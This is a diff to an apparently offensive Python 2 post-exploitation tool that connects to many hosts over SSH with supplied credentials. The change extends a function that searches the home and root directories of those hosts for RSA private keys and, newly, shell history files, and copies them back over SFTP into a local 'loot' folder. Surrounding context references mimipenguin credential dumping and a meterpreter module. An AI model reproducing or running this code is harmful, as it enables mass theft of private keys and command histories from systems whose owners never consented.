@@ -23,7 +23,7 @@ CEND = '\033[0m'
 CGREEN  = '\33[32m'
 CYELLOW = '\33[33m'
 
- 
+
 def randomword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
@@ -53,21 +53,28 @@ def copy_exec(ip, username, password, file, timeout):
         print CRED + "[!] Authentication failed!" + CEND
 
 
-def steal_keys(ip, username, password, timeout):
+def steal(ip, username, password, type, timeout):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
     try:
         client.connect(str(ip), port=22, username=username, password=password, timeout=1)
-        stdin, stdout, stderr = client.exec_command("find /home/ /root/ /Users/Spartan/Documents -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null ", timeout=timeout)
+        if type == "keys":
+            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
+        if type == "history":
+            command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
+        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
         try:
             sftp = client.open_sftp()
             for line in stdout:
                 line = line.rstrip()
-                if not os.path.exists("loot/keys/" + str(ip)):
-                    os.makedirs("loot/keys/" + str(ip))
+                if not os.path.exists("loot/" + type + "/" + str(ip)):
+                    os.makedirs("loot/" + type + "/" + str(ip))
                 print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
-                sftp.get(line, "loot/keys/" + str(ip) + "/" + line.replace("/", "_"))
+                try:
+                    sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
+                except:
+                    print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
             #sftp.close()
         except socket.timeout:
             pass
@@ -110,8 +117,8 @@ def start_thread(targets, function, args):
             t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4]))
             t.start()
         time.sleep(.5)
-        if function == "steal_keys":
-            t = threading.Thread(target=steal_keys, args=(ip, args[1], args[2], args[3]))
+        if function == "steal":
+            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4]))
             t.start()
         time.sleep(.5)
 
@@ -336,9 +343,17 @@ def main():
                 print "Must supply an LHOST for use with mimipenguin"
                 exit()
         mimipenguin(get_ip(), lport, targets, 22, args.username, args.password)
+
+
     if args.module == "keys":
         print CGREEN + "[!] Searching system for private keys..." + CEND
-        start_thread(targets, "steal_keys", [22, args.username, args.password, 100])
+        start_thread(targets, "steal", [22, args.username, args.password, "keys", 100])
+
+    if args.module == "history":
+        print CGREEN + "[!] Searching system for command history..." + CEND
+        start_thread(targets, "steal", [22, args.username, args.password, "history", 100])
+
+
     if args.module == "meterpreter":
         if not args.options:
             print "The meterpreter module requires options, You must provide an LHOST and LPORT"
